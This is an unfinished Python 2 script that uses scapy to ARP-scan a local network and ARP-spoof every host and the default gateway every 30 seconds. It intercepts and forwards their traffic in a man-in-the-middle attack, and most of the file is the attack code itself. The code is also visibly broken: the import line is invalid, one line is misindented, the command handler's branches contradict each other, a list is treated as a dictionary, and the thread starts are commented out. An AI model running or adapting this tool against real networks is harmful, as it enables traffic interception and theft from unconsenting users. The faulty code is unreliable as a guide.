#python 2.7


import logging
from threading import Thread
from time import sleep
from scapy.all import *
from datetime import datetime
import functions.py
# except ImportError:
#
#     #TODO: handle all cases of missing modules and try to solve
#     print 'a module is missing please check you have all required modules'

# global variables:
stop=True
localHost=[]
localAddresses=[]
prescanned_Packets=[]

def add_packet(pkt):
    """
    adds sniffed packets to list of prescanned packets
    and sends it forward
    """
    if ARP not in pkt:
        global prescanned_Packets
        prescanned_Packets.append(pkt)

    functions.sendPacket(pkt,localAddresses[0])



def get_MAC_Address(pkt):
    if pkt[ARP].op == 2: # is-at
        #if pkt[ARP].pdst==localHost[0]:
        address=(pkt[ARP].psrc,pkt[ARP].hwsrc)
        global localAddresses
        if address not in localAddresses:
            localAddresses.append(address)
            print len(localAddresses)
            #TODO: log all packets and check them for responses


def get_Local_Addresses(subnetMask,defaultGateway):
    """
    monitors the network for new devices and updates the list
    routinly scans all network
    """

    global localAddresses
    lastHour=0
    #all possible ranges for networks
    low_IP_Range={'255.255.255.252':True,'255.255.255.248':True,'255.255.255.240':True,'255.255.255.224':True,'255.255.255.192':True,'255.255.255.128':True,'255.255.255.0':True}
    #TODO: remove ranges below 255.255.255.0 and dont do higher than 255.255.248.0
    while True:
        if not stop:
            currentHour=int(datetime.now().strftime('%H'))
            if currentHour>lastHour: # if an hour passed, scan all possible IP addresses
                if low_IP_Range[subnetMask]:
                    for i in range(int(subnetMask.split('.')[3])+1,255):
                        IP_Addr='.'.join(defaultGateway.split('.')[:3])+'.'+str(i) #construct IP address
                        packet=Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op=1,pdst=IP_Addr)
                        sendp(packet) # send packet
                        sniff(prn=get_MAC_Address, filter="arp", store=0, count=2,timeout=3) #sniff for response

                else:
                    for i in range(int(subnetMask.split('.')[2])+1,255):
                        for j in range(int(subnetMask.split('.')[3]),255):
                            IP_Addr='.'.join(defaultGateway.split('.')[:2])+'.'+str(i)+'.'+str(j) #construct IP address
                            packet=Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op=1,pdst=IP_Addr)
                            sendp(packet) # send packet
                            sniff(prn=get_MAC_Address, filter="arp", store=0, count=2,timeout=3) #sniff for response

                if currentHour==12:# update lastHour
                    lastHour=0
                else:
                    lastHour=currentHour

            sniff(prn=get_MAC_Address, filter="arp", store=0) #sniff for new devices


def arpSpoof(defaultGateway,localMAC):
    """
    every 30 seconds send ARP broadcast to spoof all machines on LAN
    """

    while True:
        if len(localAddresses)>0:
            #TODO: change from handling dictionary to list
            for ip in localAddresses.keys()[1:]: #run through all addresses except the default gateway
                if ip != defaultGateway:

                    #create arp packets
                    victimPacket = Ether(src=localMAC,dst=localAddresses[ip])/ARP(op=2, hwsrc=localMAC,psrc = defaultGateway, pdst=ip, hwdst = localAddresses[ip])
                    #victimPacket.show()
                    gatewayPacket=Ether(dst=localAddresses[defaultGateway],src=localMAC)/ARP(op=2,hwsrc=localMAC,psrc=ip,hwdst=localAddresses[defaultGateway],pdst=defaultGateway)
                    #gatewayPacket.show()

                    #send packets
                    sendp(victimPacket)
                    sendp(gatewayPacket)
            sleep(30)

def manager():
    """
    listens for user commands and executes them
    """
    #TODO: fully flesh out all possible commands
    commands={'start':False,'stop':True}
    while True:
        command=input('Please type a command')
        if commands[command]:
            global stop
            stop=True
            if len(localAddresses)>0:
                print 'resuming operation'
                logging.debug('resuming operation')
                    pass
            else:
                print 'scanning network'
                logging.debug('scanning network')

        elif commands[command]:
            global stop
            stop=False
            print 'operation stopped'
            logging.debug('operation stopped')

def setup():
    """
    get all necessary values for the program to run
    and start all threads
    """
    global localHost
    #get default gateway and local IP address
    defaultGateway,subnetMask,localHost=functions.getLocalhostAddress()
    logging.debug('got default gateway, local IP, local MAC and Subnet Mask')

    monitorThread=Thread(target=get_Local_Addresses)
    #monitorThread.start()
    logging.debug('created thread for monitoring network for new devices')

    arpThread=Thread(target=arpSpoof,args=(defaultGateway,localHost[1],))
    #arpThread.start()
    logging.debug('created thread for ARP spoofing')

    return defaultGateway,subnetMask


def main():
    """
    control the whole program
    gets the parameters for working
    then calls all functions in order
    """
    #setup logging to file logFile.txt
    logging.basicConfig(filename='logFile.txt',level=logging.DEBUG, format='%(lineno)s - %(levelname)s : %(message)s')
    logging.info('\n\n\n\n\n########## Program Start ##########\n\n')

    managerThread=Thread(target=manager) #checks if user wants to stop
    managerThread.start()
    logging.debug('created thread for managing')

    if not stop:
        defaultGateway,subnetMask=setup() # get all necessary values before beginning

    while not stop: #main loop
        sniff(prn=add_packet,count=5) #listen for packets


    #TODO: add function to scan packets and update information about each device



if __name__=='__main__':
    main()
